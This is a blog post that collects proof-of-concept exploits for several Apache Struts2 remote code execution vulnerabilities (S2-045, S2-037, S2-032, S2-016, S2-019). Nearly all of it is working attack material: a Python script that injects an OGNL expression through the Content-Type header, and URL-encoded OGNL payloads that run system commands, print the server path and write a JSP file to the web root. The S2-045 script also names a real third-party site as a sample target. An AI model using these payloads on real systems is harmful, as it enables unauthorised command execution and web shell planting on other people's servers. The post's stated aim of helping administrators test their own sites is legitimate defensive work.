---
title: Struts2漏洞POC汇总
date: 2017-03-13 10:43:59
comments: true
tags: struts2
categories: web安全
---
<blockquote class="blockquote-center">世界上一成不变的东西，只有“任何事物都是在不断变化的”这条真理。
 —— 斯里兰卡</blockquote>
免责申明：*文章中的工具以及POC等仅供个人测试研究，请在下载后24小时内删除，不得用于商业或非法用途，否则后果自负，如有使用于黑产者，与本文无关*
<!--more -->
　　Struts2框架漏洞不断，鉴于struts2使用之广泛，本文汇总Struts2系列漏洞的Poc，给网络管理员或者站长提供查询便利，以便更好的检测自身网站存在的漏洞，也可以让安全从业者更好的了解此漏洞。

struts2-045（2017.3）
(Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10)
```bash
import urllib2
import sys
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers

def poc(url):
    register_openers()
    datagen, header = multipart_encode({"image1": open("tmp.txt", "rb")})
    header["User-Agent"]="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"]="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo nMask').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(url,datagen,headers=header)
    response = urllib2.urlopen(request)
    body=response.read()

    return body

url="http://job.10086.cn/company/anouncement/showAnouncement.action"
url=sys.argv[1]
body=poc(url)
if "nMask" in body:
    print "[Loopholes exist]",url
```
struts2_037
```bash
http://127.0.0.1:8080/struts2-rest-showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3f@java.lang.Runtime@getRuntime().exec(%23parameters.cmd):index.xhtml?cmd=calc

http://127.0.0.1:8080/struts2-rest- showcase/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse
```
struts2_032
```bash
?method:%23_memberAccess%3d%40ognl.OgnlContext%20%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command%20%5B0%5D%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char%5B51020%5D%2c%23c.read%28%23d%29%2c%23kxlzx%3d%20%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%20%29%2c%23kxlzx.close&command=whoami
```
获取磁盘目录：
```bash
method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8
```
执行命令:
```bash
method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8
```
```bash
method:%23_memberAccess[%23parameters.name1[0]]%3dtrue,%23_memberAccess[%23parameters.name[0]]%3dtrue,%23_memberAccess[%23parameters.name2[0]]%3d{},%23_memberAccess[%23parameters.name3[0]]%3d{},%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew%20java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&name=allowStaticMethodAccess&name1=allowPrivateAccess&name2=excludedPackageNamePatterns&name3=excludedClasses&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8
```
上传文件：
```bash
method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=stest.jsp&shellContent=tttt&encoding=UTF-8&pp=%2f
```
struts2_016
```bash
redirect:${%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22whoami%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()}
```
struts2_019
```bash
debug=command&expression=%23res%3d%23context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),%23res.setCharacterEncoding(%22UTF-8%22),%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{%22whoami%22})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[20000],%23d.read(%23e),%23res.getWriter().println(%23e),%23res.getWriter().flush(),%23res.getWriter().close()
```


*本文POC均来自网络收集，欢迎留言补充*